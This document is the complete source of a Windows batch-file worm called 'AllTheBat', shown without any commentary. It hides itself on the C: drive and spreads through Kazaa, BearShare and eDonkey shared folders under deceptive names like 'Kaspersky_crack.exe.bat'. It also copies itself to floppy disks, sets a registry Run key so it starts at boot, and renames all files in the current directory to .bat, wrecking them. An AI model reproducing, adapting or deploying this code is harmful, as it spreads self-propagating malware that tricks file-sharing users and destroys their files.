   @echo off
   if exist %windir%\1.sys goto 2
   if not exist %windir%\1.sys goto 1
   :1
   echo AllTheBat >>%windir%\1.sys
   copy %0 c:\AllTheBat.bat >nul
   @attrib +h +s c:\AllTheBat.bat >nul
   copy %0 c:\progra~1\kazaa\myshar~1\Love_gerls.exe.bat >nul
   copy %0 c:\progra~1\bearshare\shared\Cool_sex.exe.bat >nul
   copy %0 c:\progra~1\bearshare\shared\Gamer.exe.bat >nul
   copy %0 c:\progra~1\eDonkey2000\incoming\Game.exe.bat >nul
   copy %0 c:\progra~1\kazaa\myshar~1\Sex.exe.bat >nul
   copy %0 c:\progra~1\kazaa\myshar~1\Game_free_Love.exe.bat >nul
   copy %0 c:\progra~1\eDonkey2000\incoming\Kaspersky_crack.exe.bat >nul
   copy %0 c:\progra~1\bearshare\shared\Cool_foto.mp3.bat >nul
   copy %0 c:\progra~1\eDonkey2000\incoming\http_server.jpg.bat >nul
   copy %0 c:\progra~1\kazaa\myshar~1\Porno_photo.jpg.bat >nul
   copy %0 c:\progra~1\install.exe.bat >nul
   echo REGEDIT4>C:\ere.reg
   echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]>>C:\ere.reg
   echo "AllTheBat"="c:\\AllTheBat.bat" >> C:\ere.reg
   regedit /s C:\ere.reg
   del C:\ere.reg >nul
   :2
   for %%v in (*.*) do ren *.* *.bat
   echo project AllTheBat >>%windir%\info.txt
   copy %0 A:\readme.txt.bat >nul
   ctty con
   cls
